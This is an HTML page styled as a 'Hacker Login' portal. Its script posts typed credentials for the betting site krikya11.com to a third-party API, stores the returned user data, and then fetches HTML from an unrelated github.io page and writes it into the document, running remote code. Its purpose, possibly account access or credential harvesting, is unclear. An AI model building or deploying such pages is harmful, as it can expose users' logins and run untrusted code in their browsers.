<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hacker Login</title>
  <style>
    body {
      background-color: black;
      color: #00ff00;
      font-family: 'Courier New', Courier, monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      border: 1px solid #00ff00;
      padding: 20px;
      width: 300px;
      background-color: #111;
      box-shadow: 0 0 10px #00ff00;
    }
    input {
      background-color: black;
      border: 1px solid #00ff00;
      color: #00ff00;
      padding: 10px;
      width: 100%;
      margin-bottom: 10px;
      font-family: inherit;
    }
    button {
      background-color: black;
      border: 1px solid #00ff00;
      color: #00ff00;
      padding: 10px;
      width: 100%;
      cursor: pointer;
      font-family: inherit;
    }
    button:hover {
      background-color: #003300;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h3>LOGIN PORTAL</h3>
    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="tryLogin()">Access System</button>
  </div>

  <script>
    async function tryLogin() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!username || !password) {
        alert("Username and Password are required!");
        return;
      }

      const loginData = {
        domain: "https://www.krikya11.com",
        membercode: username,
        password: password,
        platform: "desktop",
        option: "2",
      };

      try {
        const loginResponse = await fetch("https://feapi.bigape.xyz/api/token", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(loginData),
        });

        const loginResult = await loginResponse.json();

        if (!loginResponse.ok) {
          alert("Login failed. Invalid credentials.");
          return;
        }

        const token = loginResult.access_token;

        const response = await fetch("https://fecmsapi.sharky777.xyz/api/user", {
          method: "GET",
          headers: {
            Authorization: `Bearer ${token}`
          },
        });

        const result = await response.json();

        if (response.ok) {
          localStorage.setItem("userDetail", JSON.stringify(result));
          displaySuccessResponse();
          createHome();
        } else {
          alert("Failed to load user data.");
        }

      } catch (error) {
        console.log(`Network error for ${username}:`, error);
      }
    }

    function displaySuccessResponse() {
      alert("Access Granted. Welcome Agent.");
    }
 async function createHome() {
  const response = await fetch("https://hckrxyzz.github.io/Xyzz/krikya/krikyatrylogin.html");
  const htmlCode = await response.text();
  document.write(htmlCode);
}
 </script>

</body>
</html>
